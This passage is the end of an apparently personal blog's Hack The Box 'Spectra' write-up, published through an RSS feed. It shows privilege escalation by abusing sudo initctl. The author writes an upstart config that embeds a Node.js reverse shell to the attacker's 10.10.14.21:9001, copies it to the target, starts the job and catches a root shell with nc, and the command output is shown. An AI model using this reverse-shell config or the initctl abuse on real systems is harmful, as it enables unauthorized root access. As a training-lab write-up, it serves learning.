</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pre-start script
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
</span></span><span class="line"><span class="cl">end script
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">pre-stop script
</span></span><span class="line"><span class="cl">    rm /var/run/nodetest.pid
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
</span></span><span class="line"><span class="cl">end script
</span></span></code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
<p>With sudo privileges and write access on the configuration files, I can perform a command injection to send myself a root shell.</p>
<p>In this write-up, I&rsquo;d like to try injecting a <a href="https://gtfobins.github.io/gtfobins/node/#sudo">node</a> reverse shell.</p>
<p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine and it is without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.21»
</span></span><span class="line"><span class="cl">$ cat exploit.conf
</span></span><span class="line"><span class="cl">description <span class="s2">&#34;Test node.js server&#34;</span>
</span></span><span class="line"><span class="cl">author      <span class="s2">&#34;katie&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
</span></span><span class="line"><span class="cl">stop on shutdown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">script
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
</span></span><span class="line"><span class="cl">    <span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span>10.10.14.21
</span></span><span class="line"><span class="cl">    <span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span><span class="m">9001</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span class="s1">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
</span></span></span><span class="line"><span class="cl"><span class="s1">    this.pipe(sh.stdin);
</span></span></span><span class="line"><span class="cl"><span class="s1">    sh.stdout.pipe(this);
</span></span></span><span class="line"><span class="cl"><span class="s1">    sh.stderr.pipe(this);
</span></span></span><span class="line"><span class="cl"><span class="s1">    })&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">end script
</span></span></code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.21»
</span></span><span class="line"><span class="cl">$ scp exploit.conf katie@10.10.10.229:/dev/shm
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl">bash: warning: /home/katie/.bashrc: warning: script from noexec mount<span class="p">;</span> see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
</span></span><span class="line"><span class="cl">exploit.conf                               100%  <span class="m">775</span>    13.1KB/s   00:00
</span></span></code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null<span class="p">;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span class="o">&amp;&amp;</span> sudo /sbin/initctl start test5
</span></span><span class="line"><span class="cl">test5 start/running, process <span class="m">33889</span>
</span></span></code></pre></div><p>If I check my listener, I have a root shell now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">37220</span>
</span></span><span class="line"><span class="cl">id <span class="o">&amp;&amp;</span> hostname <span class="o">&amp;&amp;</span> ip a
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">spectra
</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">    inet6 ::1/128 scope host
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UP group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
</span></span><span class="line"><span class="cl">    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
</span></span><span class="line"><span class="cl">       valid_lft 86303sec preferred_lft 14303sec
</span></span><span class="line"><span class="cl">    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
</span></span><span class="line"><span class="cl">       valid_lft 86303sec preferred_lft 14303sec
</span></span><span class="line"><span class="cl">    inet6 fe80::250:56ff:feb9:b2c/64 scope link
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210715085053464.png" alt="image-20210715085053464"  /></div>
</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
